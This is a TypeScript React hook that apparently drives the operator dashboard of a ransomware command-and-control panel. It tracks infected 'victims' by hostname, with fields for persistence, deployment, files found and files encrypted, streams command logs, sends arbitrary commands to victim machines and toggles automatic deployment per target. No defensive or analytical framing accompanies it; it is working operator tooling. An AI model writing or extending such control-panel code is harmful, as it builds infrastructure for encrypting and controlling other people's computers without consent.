import { useState, useEffect, useCallback, useRef } from 'react';
import { io, Socket } from 'socket.io-client';

export interface BackendVictimInfo {
  last_seen: string;
  data: {
    hostname: string;
    agent?: string;
    type?: string;
    os?: string;
    platform?: string;
    architecture?: string;
    version?: string;
    username?: string;
    ip?: string;
    persistent?: boolean;
    deployed?: boolean;
    status?: string;
    files_found?: number;
    files_encrypted?: number;
    [key: string]: unknown;
  };
  last_result?: { result?: string };
}

export interface BackendLogEntry {
  hostname: string;
  command: string;
  result?: string;
  timestamp: string;
}

interface UseSocketReturn {
  victims: Record<string, BackendVictimInfo>;
  logs: BackendLogEntry[];
  connected: boolean;
  autoDeploy: Record<string, boolean>;
  stats: { victimCount: number; logCount: number };
  sendCommand: (hostname: string, command: string, params?: Record<string, string>) => void;
  toggleAutoDeploy: (hostname: string, enabled: boolean) => void;
}

export default function useSocket(): UseSocketReturn {
  const [victims, setVictims] = useState<Record<string, BackendVictimInfo>>({});
  const [logs, setLogs] = useState<BackendLogEntry[]>([]);
  const [connected, setConnected] = useState(false);
  const [autoDeploy, setAutoDeploy] = useState<Record<string, boolean>>({});
  const [stats, setStats] = useState({ victimCount: 0, logCount: 0 });
  const socketRef = useRef<Socket | null>(null);

  useEffect(() => {
    const s = io({ transports: ['websocket', 'polling'] });

    s.on('connect', () => {
      setConnected(true);
    });

    s.on('disconnect', () => {
      setConnected(false);
    });

    s.on('dashboard_state', (data: {
      victims?: Record<string, BackendVictimInfo>;
      logs?: BackendLogEntry[];
      auto_deploy_targets?: string[];
    }) => {
      setVictims(data.victims || {});
      setLogs(data.logs || []);
      const ad: Record<string, boolean> = {};
      for (const h of (data.auto_deploy_targets || [])) {
        ad[h] = true;
      }
      setAutoDeploy(ad);
    });

    s.on('victim_update', (data: { hostname: string; info: BackendVictimInfo }) => {
      setVictims(prev => ({ ...prev, [data.hostname]: data.info }));
    });

    s.on('victim_removed', (data: { hostname: string }) => {
      setVictims(prev => {
        const next = { ...prev };
        delete next[data.hostname];
        return next;
      });
    });

    s.on('command_log_update', (data: { entry: BackendLogEntry }) => {
      setLogs(prev => [data.entry, ...prev].slice(0, 100));
    });

    s.on('auto_deploy_toggled', (data: { hostname: string; enabled: boolean } & Record<string, unknown>) => {
      if (data.error) return;
      setAutoDeploy(prev => {
        const next = { ...prev };
        if (data.enabled) {
          next[data.hostname] = true;
        } else {
          delete next[data.hostname];
        }
        return next;
      });
    });

    socketRef.current = s;
    return () => { s.disconnect(); };
  }, []);

  useEffect(() => {
    setStats({
      victimCount: Object.keys(victims).length,
      logCount: logs.length,
    });
  }, [victims, logs]);

  const sendCommand = useCallback((hostname: string, command: string, params: Record<string, string> = {}) => {
    if (socketRef.current) {
      socketRef.current.emit('send_command', { hostname, command, params });
    }
  }, []);

  const toggleAutoDeploy = useCallback((hostname: string, enabled: boolean) => {
    if (socketRef.current) {
      socketRef.current.emit('toggle_auto_deploy', { hostname, enabled });
    }
  }, []);

  return { victims, logs, connected, autoDeploy, stats, sendCommand, toggleAutoDeploy };
}
